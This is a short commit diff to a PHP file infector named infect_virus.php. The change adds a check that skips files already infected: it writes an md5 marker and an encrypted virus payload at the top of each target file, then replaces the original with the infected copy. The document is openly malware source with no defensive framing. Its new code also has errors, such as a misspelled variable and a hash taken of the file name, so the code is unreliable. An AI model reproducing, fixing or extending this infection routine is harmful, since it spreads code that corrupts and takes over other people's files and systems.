Added Checksum functionality and wiped out some typo errors.

+++ infect_virus.php
@@ -10,24 +10,35 @@
             # open the file and read targeted(.dev)...
             $script = fopen($filename, "r");
 
-            //to avoid issues with large files->file to handle
-            $infected = fopen("$filename.infected", "w");
+            // check whether the file is infected
+            $fist_line = fgets($script); // gets first line of the file
+            $virus_hash = md5($filename); //creates a hash 
 
-            $infection = '<?php '.encryptedVirus($virus).' ?>';
+            // check whether the hash appears on the first line of the file
+            if(strpos($first_line, $virus_hash) == false){
 
-            fputs($infected, $infection, strlen($infection));
-
-            //loop through
-            while($contents = fgets($script)){
-                fputs($infected, $contents, strlen($contents));  
-
+                //to avoid issues with large files->file to handle
+                $infected = fopen("$filename.infected", "w");
+                
+                $checksum = $virus_hash;
+                $infection = '<?php '.encryptedVirus($virus).' ?>';
+                
+                fputs($infected, $checksum, strlen($checksum));
+                fputs($infected, $infection, strlen($infection));
+                fputs($infected, $first_line, strlen($first_line));
+    
+                //loop through
+                while($contents = fgets($script)){
+                    fputs($infected, $contents, strlen($contents));  
+    
+                }
+    
+                //close all the handles and move the infected files in to place
+                fclose($script);
+                fclose($infected);
+                unlink($filename);
+                rename("$filename.infected", $filename);
             }
-
-            //close all the handles and move the infected files in to place
-            fclose($script);
-            fclose($infected);
-            unlink($filename);
-            rename("$filename.infected", $filename);
         }
     
     }
